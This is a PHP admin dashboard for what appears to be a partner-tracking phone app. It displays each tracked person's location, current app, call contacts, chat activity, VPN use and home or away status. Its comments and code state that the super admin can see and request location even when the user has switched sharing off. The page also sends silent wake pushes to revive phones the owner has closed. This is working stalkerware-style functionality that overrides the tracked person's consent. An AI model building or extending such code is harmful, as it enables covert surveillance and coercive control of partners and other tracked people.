<?php
require_once __DIR__ . '/_boot.php';
ss_require_owner();
$PAGE_TITLE = 'Current Status';
$PAGE_SUB   = 'Live device status, current app & location — per user';
$PAGE_ICON  = '📍';

// Super admin taps "Request location": queue an on-demand fix. The phone answers
// on its next ping (usually within a minute), even if the user's partner-sharing
// toggle is off. Re-requesting is always allowed — if one is already pending we
// just refresh its timestamp so the phone keeps trying, without piling up rows.
// Auto-wake: any device quiet for 1+ min gets a silent wake push. Throttled to
// once per minute so the 15s auto-refresh doesn't spam. Makes wakes automatic just
// from viewing this page, even without the cron set up.
if (function_exists('ss_wake_stale')) { try { ss_wake_stale($pdo, (int)ss_setting($pdo, 'wake_stale_minutes', '1'), 60); } catch (\Throwable $e) {} }

$flash = '';
// Global "Foreground tracking" switch: ON = always-on foreground service; OFF =
// phones stop the service and go dormant (no notification, no tracking).
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['set_foreground_on'])) {
    ss_set_setting($pdo, 'foreground_on', $_POST['set_foreground_on'] === '1' ? '1' : '0');
    $flash = 'Foreground tracking updated. Phones apply it on their next sync (within a few minutes).';
}
// Just wake the phone (revive its foreground service) — no location requested.
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['wake_user'])) {
    $wid = (int)$_POST['wake_user'];
    if ($wid > 0 && function_exists('ss_wake_user')) {
        $ok = false; try { $ok = ss_wake_user($pdo, $wid); } catch (\Throwable $e) {}
        $flash = $ok
            ? 'Wake sent — the phone should reconnect within a moment.'
            : 'Could not send wake. Check that the FCM service-account JSON is set in Settings and the user is logged in.';
    }
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['req_loc'])) {
    $uid = (int)$_POST['req_loc'];
    if ($uid > 0) {
        $ex = $pdo->prepare("SELECT id FROM location_requests WHERE user_id=? AND status='pending' ORDER BY id DESC LIMIT 1");
        $ex->execute([$uid]);
        $pid = $ex->fetchColumn();
        if ($pid) {
            $pdo->prepare("UPDATE location_requests SET requested_at=NOW() WHERE id=?")->execute([$pid]);
        } else {
            $pdo->prepare("INSERT INTO location_requests (user_id, status, requested_at) VALUES (?, 'pending', NOW())")
                ->execute([$uid]);
        }
        // Also send a silent wake push so a killed/sleeping phone answers now,
        // not only on its next scheduled check-in. Best effort (needs FCM set up).
        if (function_exists('ss_wake_user')) { try { ss_wake_user($pdo, $uid); } catch (\Throwable $e) {} }
        $flash = 'Location requested — the phone will report its position shortly.';
    }
}

$rows = $pdo->query(
    "SELECT u.id, u.username, u.name, u.is_online, u.last_seen, u.presence_at,
            d.battery, d.is_charging, d.network_type, d.device_model, d.app_version,
            d.current_app, d.current_activity, d.current_app_source, d.current_wifi, d.is_home, d.home_wifi, d.on_call, d.call_started_at, d.call_contact, d.sim_count, d.sim_info, d.headphone, d.vpn_active, d.usb_connected, d.casting, d.ringer_mode, d.unlock_count, d.network_app, d.last_seen AS sync_at,
            (SELECT devices FROM bluetooth_log bl WHERE bl.user_id=u.id ORDER BY bl.id DESC LIMIT 1) AS bt_devices,
            (SELECT CONCAT(event,'|',at) FROM place_events pe WHERE pe.user_id=u.id ORDER BY pe.id DESC LIMIT 1) AS last_place,
            t.share_location, t.share_usage, t.share_notifs, t.share_device,
            (SELECT recorded_at FROM locations l WHERE l.user_id=u.id ORDER BY l.id DESC LIMIT 1) AS loc_at,
            (SELECT accuracy FROM locations l WHERE l.user_id=u.id ORDER BY l.id DESC LIMIT 1) AS loc_acc,
            (SELECT CONCAT(lat,',',lng) FROM locations l WHERE l.user_id=u.id ORDER BY l.id DESC LIMIT 1) AS loc,
            (SELECT status FROM location_requests lr WHERE lr.user_id=u.id ORDER BY lr.id DESC LIMIT 1) AS loc_req_status,
            (SELECT requested_at FROM location_requests lr WHERE lr.user_id=u.id ORDER BY lr.id DESC LIMIT 1) AS loc_req_at
     FROM users u
     LEFT JOIN device_status d ON d.user_id=u.id
     LEFT JOIN tracking_settings t ON t.user_id=u.id
     WHERE u.role='user'
     ORDER BY u.is_online DESC, u.last_seen DESC"
)->fetchAll();

$total   = count($rows);
$onlineN = 0; $sharingLoc = 0;
foreach ($rows as $r) {
    if ($r['is_online'] && !empty($r['presence_at']) && strtotime($r['presence_at']) > time()-70) $onlineN++;
    if ($r['share_location']) $sharingLoc++;
}
require __DIR__ . '/_dark_head.php';
$auto = ($_GET['auto'] ?? '1') !== '0'; // auto-refresh on by default
?>
<!-- Live refresh bar: shows the current app as of the phone's last ~12s ping -->
<div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:14px">
  <a class="btn" href="javascript:location.reload()" style="background:#ec4899;color:#fff">🔄 Refresh now</a>
  <a class="btn" href="?auto=<?= $auto?'0':'1' ?>" style="padding:6px 12px"><?= $auto?'⏸ Auto-refresh: ON':'▶ Auto-refresh: OFF' ?></a>
  <span style="color:var(--mut);font-size:.75rem">Last loaded <b><?= date('H:i:s') ?></b> · phone reports the live app every ~12s</span>
</div>
<?php if($auto): ?><script>setTimeout(function(){ location.reload(); }, 15000);</script><?php endif; ?>
<?php if($flash): ?><div class="flash ok" style="margin-bottom:14px;padding:10px 14px;border-radius:10px;background:rgba(34,197,94,.12);color:#4ade80;font-size:.85rem"><?= ss_admin_h($flash) ?></div><?php endif; ?>
<?php $fgOn = (int)ss_setting($pdo, 'foreground_on', '1') === 1; ?>
<div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:14px;padding:12px 14px;border:1px solid var(--line);border-radius:12px;background:var(--panel)">
  <div style="flex:1;min-width:220px">
    <div style="font-weight:700;font-size:.9rem">Foreground tracking: <?= $fgOn ? '🟢 ON (always-on)' : '🔴 OFF (dormant)' ?></div>
    <div style="color:var(--mut);font-size:.72rem">ON = app hamesha chalti hai (permanent notification), khud har ~6 min self-heal karti hai agar OEM maar de. OFF = app service band kar deti hai — koi notification, koi tracking nahi.</div>
  </div>
  <form method="post" style="margin:0">
    <input type="hidden" name="set_foreground_on" value="<?= $fgOn ? '0' : '1' ?>">
    <button class="btn" type="submit" style="padding:8px 14px;font-size:.8rem;background:<?= $fgOn ? '#ef4444' : '#22c55e' ?>;color:#fff;border:none;cursor:pointer"><?= $fgOn ? 'Turn Foreground OFF' : 'Turn Foreground ON' ?></button>
  </form>
</div>
<div class="cards">
  <div class="stat"><div class="h"><span class="dot">👥</span> Users Tracked</div><div class="v"><?= $total ?></div></div>
  <div class="stat"><div class="h"><span class="dot">🟢</span> Online Now</div><div class="v"><?= $onlineN ?></div></div>
  <div class="stat"><div class="h"><span class="dot">📍</span> Sharing Location</div><div class="v"><?= $sharingLoc ?></div></div>
</div>

<div class="grid" style="grid-template-columns:repeat(auto-fill,minmax(320px,1fr))">
<?php if(!$rows): ?>
  <div class="panel"><div class="empty">No users yet.</div></div>
<?php else: foreach($rows as $r):
    $on = $r['is_online'] && !empty($r['presence_at']) && strtotime($r['presence_at']) > time()-70;
    $bat = $r['battery'];
    $batColor = $bat===null ? '#334155' : ($bat<20?'#ef4444':($bat<50?'#f59e0b':'#22c55e'));
?>
  <div class="panel" style="padding:0;overflow:hidden;<?= $on ? 'background:rgba(34,197,94,.04);border:1px solid rgba(34,197,94,.2);box-shadow:0 0 20px rgba(34,197,94,.06)' : '' ?>">
    <div style="display:flex;align-items:center;gap:12px;padding:16px;border-bottom:1px solid var(--line)">
      <div style="width:44px;height:44px;border-radius:50%;background:linear-gradient(135deg,#a855f7,#ec4899);display:flex;align-items:center;justify-content:center;font-weight:800;font-size:1.1rem;position:relative">
        <?= ss_admin_h(strtoupper(substr($r['name'],0,1))) ?>
        <span style="position:absolute;right:0;bottom:0;width:12px;height:12px;border-radius:50%;border:2px solid var(--panel);background:<?= $on?'#22c55e':'#64748b' ?>"></span>
      </div>
      <div style="flex:1">
        <div style="font-weight:700"><?= ss_admin_h($r['name']) ?></div>
        <div style="font-size:.75rem;color:var(--mut)">@<?= ss_admin_h($r['username']) ?></div>
      </div>
      <span class="pill" style="background:<?= $on?'rgba(34,197,94,.15)':'rgba(100,116,139,.15)' ?>;color:<?= $on?'#4ade80':'#94a3b8' ?>"><?= $on?'Online':'Offline' ?></span>
    </div>

    <div style="padding:16px;display:grid;grid-template-columns:1fr 1fr;gap:14px;font-size:.82rem">
      <div>
        <div style="color:var(--mut);font-size:.68rem;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px">Battery</div>
        <?php if($bat!==null): ?>
          <div style="display:flex;align-items:center;gap:6px">
            <div style="flex:1;height:8px;background:var(--soft);border-radius:50px;overflow:hidden"><div style="height:100%;width:<?= (int)$bat ?>%;background:<?= $batColor ?>"></div></div>
            <span style="font-weight:700"><?= (int)$bat ?>%<?= $r['is_charging']?' ⚡':'' ?></span>
          </div>
        <?php else: ?><span style="color:var(--mut)">—</span><?php endif; ?>
      </div>
      <div>
        <div style="color:var(--mut);font-size:.68rem;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px">Network</div>
        <?php $nt = $r['network_type'] ?: ''; $ntBadge = match(strtolower($nt)) { 'wifi' => ['📶 WiFi','rgba(34,197,94,.15)','#4ade80'], 'mobile data' => ['📱 Mobile Data','rgba(59,130,246,.15)','#60a5fa'], 'offline' => ['❌ Offline','rgba(239,68,68,.15)','#f87171'], default => null }; ?>
        <?php if($ntBadge): ?><span class="pill" style="background:<?= $ntBadge[1] ?>;color:<?= $ntBadge[2] ?>;font-weight:700"><?= $ntBadge[0] ?></span><?php else: ?><div><?= ss_admin_h($nt ?: '—') ?></div><?php endif; ?>
      </div>
      <div>
        <div style="color:var(--mut);font-size:.68rem;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px">SIM</div>
        <?php
        $simData = !empty($r['sim_info']) ? json_decode($r['sim_info'], true) : null;
        $simCnt = (int)($r['sim_count'] ?? 0);
        if ($simData && !empty($simData['sims'])):
            foreach ($simData['sims'] as $sim): ?>
            <span class="pill" style="background:rgba(168,85,247,.15);color:#c084fc;font-size:.7rem">SIM<?= (int)$sim['slot'] ?> <?= ss_admin_h($sim['carrier'] ?: '?') ?></span>
            <?php endforeach;
        else: ?>
            <div style="color:var(--mut)">—</div>
        <?php endif; ?>
      </div>
      <div>
        <div style="color:var(--mut);font-size:.68rem;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px">Bluetooth</div>
        <?php
        $btDevs = !empty($r['bt_devices']) ? json_decode($r['bt_devices'], true) : null;
        if ($btDevs && is_array($btDevs)):
            foreach ($btDevs as $bd):
                $bIcon = match($bd['type'] ?? '') { 'audio' => '🎧', 'phone' => '📱', 'computer' => '💻', 'wearable' => '⌚', default => '📡' };
            ?>
            <span class="pill" style="background:rgba(99,102,241,.15);color:#818cf8;font-size:.7rem"><?= $bIcon ?> <?= ss_admin_h($bd['name'] ?? '?') ?></span>
            <?php endforeach;
        else: ?>
            <div style="color:var(--mut)">—</div>
        <?php endif; ?>
      </div>
      <div>
        <div style="color:var(--mut);font-size:.68rem;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px">Device</div>
        <div><?= ss_admin_h($r['device_model'] ?: '—') ?><?= $r['app_version']?' <span style="color:var(--mut)">v'.ss_admin_h($r['app_version']).'</span>':'' ?></div>
      </div>
      <div style="grid-column:1 / -1">
        <div style="color:var(--mut);font-size:.68rem;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px">Current Status</div>
        <div style="display:flex;align-items:center;flex-wrap:wrap;gap:8px">
          <span class="pill" style="background:<?= $on?'rgba(34,197,94,.15)':'rgba(100,116,139,.15)' ?>;color:<?= $on?'#4ade80':'#94a3b8' ?>"><?= $on?'🟢 Online':'⚪ Offline' ?></span>
          <?php if(!empty($r['on_call']) && !empty($r['call_started_at'])):
              $callSecs = max(0, time() - strtotime($r['call_started_at']));
              $cm = intdiv($callSecs,60); $csx = $callSecs%60;
              $callDur = $cm>0 ? "{$cm}m {$csx}s" : "{$csx}s"; ?>
            <span class="pill" style="background:rgba(34,197,94,.16);color:#22c55e;font-size:.72rem;font-weight:700">📞 On call · <?= $callDur ?></span>
            <span style="font-size:.78rem;color:var(--mut)"><?= ss_admin_h($r['current_app'] ?: '') ?></span>
            <?php if(!empty($r['call_contact'])): ?><span class="pill" style="background:rgba(59,130,246,.15);color:#60a5fa;font-size:.72rem">👤 <?= ss_admin_h($r['call_contact']) ?></span><?php endif; ?>
          <?php else: ?>
          <span style="font-size:.8rem">📱 Using: <b><?= ss_admin_h($r['current_app'] ?: '—') ?></b><?php if(!empty($r['current_activity'])): ?> <span class="pill" style="background:rgba(236,72,153,.15);color:#f472b6;font-size:.7rem">🎬 <?= ss_admin_h($r['current_activity']) ?></span><?php endif; ?>
          <?php
            // Accuracy of the "current app" value — which signal it came from.
            if (!empty($r['current_app'])) {
              $src = $r['current_app_source'] ?? '';
              $badge = null;
              if ($src === 'accessibility')      $badge = ['🟢 Live', 'rgba(34,197,94,.16)', '#22c55e'];
              elseif ($src === 'network')        $badge = ['🌐 via Network', 'rgba(99,102,241,.16)', '#818cf8'];
              elseif ($src === 'usage_events')   $badge = ['🟡 ~approx', 'rgba(234,179,8,.16)', '#eab308'];
              elseif ($src === 'usage_recent')   $badge = ['🟠 ~recent', 'rgba(249,115,22,.16)', '#f97316'];
              if ($badge): ?>
              <span class="pill" title="How this was detected" style="background:<?= $badge[1] ?>;color:<?= $badge[2] ?>;font-size:.68rem;font-weight:700"><?= $badge[0] ?></span>
          <?php endif; }
            // "Typing to someone" — a chat app is on screen (metadata only, admin-only).
            $chatApps = ['whatsapp','instagram','messenger','telegram','snapchat','signal','discord','hike','wechat','viber','skype'];
            $capp = mb_strtolower((string)($r['current_app'] ?? ''));
            $isChat = false; foreach($chatApps as $ca){ if($capp!=='' && mb_strpos($capp,$ca)!==false){ $isChat=true; break; } }
            if ($isChat): ?>
            <span class="pill" style="background:rgba(59,130,246,.16);color:#60a5fa;font-size:.68rem;font-weight:700">✍️ Typing to someone</span>
          <?php endif; ?>
          </span>
          <?php endif; ?>
          <?php
            // 🕵️ Hidden/background app using network (different from foreground)
            $netApp = $r['network_app'] ?? '';
            $fgApp = $r['current_app'] ?? '';
            if ($netApp !== '' && mb_strtolower($netApp) !== mb_strtolower($fgApp)): ?>
              <br><span style="font-size:.75rem">🕵️ Background: <b><?= ss_admin_h($netApp) ?></b> <span class="pill" style="background:rgba(239,68,68,.15);color:#f87171;font-size:.65rem;font-weight:700">⚠️ Hidden Activity</span></span>
          <?php endif; ?>
          <?php
            // 🏠 Home status (admin-only, via home Wi-Fi).
            $lp = $r['last_place'] ?? '';
            if ((int)($r['is_home'] ?? 0) === 1): ?>
              <span class="pill" style="background:rgba(34,197,94,.16);color:#4ade80;font-size:.7rem;font-weight:700">🏠 At home</span>
            <?php elseif (!empty($r['home_wifi'])): ?>
              <span class="pill" style="background:rgba(148,163,184,.16);color:#94a3b8;font-size:.7rem;font-weight:700">🚶 Away</span>
            <?php endif;
            if (!empty($r['current_wifi'])): ?><span style="color:var(--mut);font-size:.7rem">📶 <?= ss_admin_h($r['current_wifi']) ?></span><?php endif;
            if ($lp !== '') { $parts = explode('|',$lp,2); $ev=$parts[0]; $at=$parts[1]??''; $lbl = $ev==='reached_home'?'🏠 reached home':'🚶 left home'; ?>
              <span style="color:var(--mut);font-size:.7rem"><?= $lbl ?> <?= $at?date('d M H:i',strtotime($at)):'' ?></span>
            <?php } ?>
          <?php if(!empty($r['headphone'])): ?><span class="pill" style="background:rgba(168,85,247,.15);color:#c084fc;font-size:.68rem">🎧 Headphone</span><?php endif; ?>
          <?php if(!empty($r['vpn_active'])): ?><span class="pill" style="background:rgba(239,68,68,.15);color:#f87171;font-size:.68rem;font-weight:700">🛡️ VPN On</span><?php endif; ?>
          <?php if(!empty($r['usb_connected'])): ?><span class="pill" style="background:rgba(249,115,22,.15);color:#fb923c;font-size:.68rem">🔌 USB</span><?php endif; ?>
          <?php if(!empty($r['casting'])): ?><span class="pill" style="background:rgba(236,72,153,.15);color:#f472b6;font-size:.68rem">📺 Casting</span><?php endif; ?>
          <?php if(($r['ringer_mode'] ?? '') === 'silent'): ?><span class="pill" style="background:rgba(239,68,68,.12);color:#f87171;font-size:.68rem">🔇 Silent</span><?php elseif(($r['ringer_mode'] ?? '') === 'vibrate'): ?><span class="pill" style="background:rgba(249,115,22,.12);color:#fb923c;font-size:.68rem">📳 Vibrate</span><?php endif; ?>
          <?php if($r['loc']): /* super admin sees location regardless of the user's share toggle (that toggle only hides it from the PARTNER in-app) */ ?>
            <a class="btn" style="padding:4px 10px;font-size:.72rem" target="_blank" href="https://maps.google.com/?q=<?= ss_admin_h($r['loc']) ?>">📍 Location ↗</a>
            <span style="color:var(--mut);font-size:.7rem"><?= $r['loc_at']?date('d M H:i',strtotime($r['loc_at'])):'' ?><?php if($r['loc_acc']!==null && (float)$r['loc_acc']>0): ?> · ±<?= (int)round((float)$r['loc_acc']) ?>m<?php endif; ?><?= $r['share_location']?'':' · hidden from partner' ?></span>
          <?php else: ?><span style="color:var(--mut);font-size:.75rem">📍 no location yet</span><?php endif; ?>
          <?php $pendingReq = ($r['loc_req_status'] === 'pending'); ?>
          <?php if($pendingReq): ?>
            <span class="pill" style="background:rgba(245,158,11,.15);color:#fbbf24">⏳ Requested <?= $r['loc_req_at']?date('H:i',strtotime($r['loc_req_at'])):'' ?> · waiting for phone</span>
          <?php endif; ?>
          <form method="post" style="display:inline">
            <input type="hidden" name="req_loc" value="<?= (int)$r['id'] ?>">
            <button class="btn" type="submit" style="padding:4px 10px;font-size:.72rem;background:#6366f1;color:#fff;border:none;cursor:pointer"><?= $pendingReq ? '🔄 Request again' : '📡 Request location now' ?></button>
          </form>
          <form method="post" style="display:inline">
            <input type="hidden" name="wake_user" value="<?= (int)$r['id'] ?>">
            <button class="btn" type="submit" style="padding:4px 10px;font-size:.72rem;background:#0ea5e9;color:#fff;border:none;cursor:pointer" title="Wake the phone / restart its background service without asking for location">⚡ Wake now</button>
          </form>
        </div>
      </div>
      <div>
        <div style="color:var(--mut);font-size:.68rem;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px">Last Sync</div>
        <div style="color:var(--mut)"><?= $r['sync_at']?date('d M H:i',strtotime($r['sync_at'])):'—' ?></div>
      </div>
    </div>

    <div style="padding:10px 16px;border-top:1px solid var(--line);font-size:.72rem;color:var(--mut)">
      Shares:
      <?= $r['share_location']?'📍 Location ':'' ?>
      <?= $r['share_usage']?'📱 Usage ':'' ?>
      <?= $r['share_notifs']?'🔔 Notifs ':'' ?>
      <?= $r['share_device']?'🔋 Device':'' ?>
      <?= (!$r['share_location'] && !$r['share_usage'] && !$r['share_notifs'] && !$r['share_device'])?'nothing':'' ?>
    </div>
  </div>
<?php endforeach; endif; ?>
</div>
<?php require __DIR__ . '/_dark_foot.php';
